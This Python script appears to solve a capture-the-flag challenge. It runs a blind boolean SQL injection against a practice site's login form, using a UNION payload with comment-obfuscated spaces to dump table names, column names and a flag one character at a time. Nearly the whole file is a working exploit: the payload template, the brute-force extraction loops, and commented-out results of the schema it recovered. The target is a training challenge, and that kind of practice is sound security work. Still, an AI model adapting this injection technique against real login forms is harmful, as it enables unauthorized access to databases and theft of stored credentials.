import codecs
import string
import requests
import sys

char_set = ' ' + string.ascii_letters + string.digits + string.punctuation

target = 'https://hackme.inndy.tw/login1/'
payload_template = r'gues3t\' UNION ALL SELECT 1,1,1,(SUBSTRING(({}),{},1)=0x{})#'.replace(' ', '/***/')

# r1 = requests.post(target, data={
#     'name': payload_template.format(0),
#     'password': 'foo'
# })
#
# print(r1.text)


def get_tables():
    tables = ''
    # tables += '0bdb54c98123f5526ccaed982d2006a9'
    table_name_query = \
        'SELECT GROUP_CONCAT(table_name SEPARATOR "<>") FROM information_schema.tables WHERE TABLE_SCHEMA = DATABASE()'\
        .replace(' ', '/***/')
    for i in range(1, 100):
        print(i, end=' ')
        for c in char_set:
            print(c, end='')
            sys.stdout.flush()
            payload = payload_template.format(table_name_query, i, codecs.encode(c.encode(), 'hex').decode())
            r = requests.post(target, data={
                'name': payload,
                'password': 'foo'
            })
            if 'You are not admin!' not in r.text:
                tables += c
                print('\n' + tables)
                break


def get_columns(table_name):
    columns = ''
    column_name_query = \
        f'SELECT GROUP_CONCAT(column_name SEPARATOR "<>") FROM information_schema.columns WHERE table_name="{table_name}"'\
        .replace(' ', '/***/')
    for i in range(1, 100):
        print(i, end=' ')
        for c in char_set:
            print(c, end='')
            sys.stdout.flush()
            payload = payload_template.format(column_name_query, i, codecs.encode(c.encode(), 'hex').decode())
            r = requests.post(target, data={
                'name': payload,
                'password': 'foo'
            })
            if 'You are not admin!' not in r.text:
                columns += c
                print('\n' + columns)
                break


def get_row(row_name, table_name):
    result = 'FLAG{W0W,'
    for i in range(10, 100):
        print(i, end=' ')
        for c in char_set:
            print(c, end='')
            sys.stdout.flush()
            payload = payload_template.format(f'SELECT GROUP_CONCAT({row_name}) FROM {table_name}'.replace(' ', '/***/'), i, codecs.encode(c.encode(), 'hex').decode())

            r = requests.post(target, data={
                'name': payload,
                'password': 'foo'
            })
            if 'You are not admin!' not in r.text:
                result += c
                print('\n' + result)
                break


# get_tables()
# tables = ['0bdb54c98123f5526ccaed982d2006a9', 'users']

# get_columns('0bdb54c98123f5526ccaed982d2006a9')
# columns = ['4a391a11cfa831ca740cf8d00782f3a6', 'id']

# get_columns('users')
# columns = ['id', 'name', 'password', 'isadmin']

# get_row('name,id', 'users')
get_row('4a391a11cfa831ca740cf8d00782f3a6', '0bdb54c98123f5526ccaed982d2006a9')
flag = 'FLAG{W0W, You found the correct table and the flag, and UserAgent}'
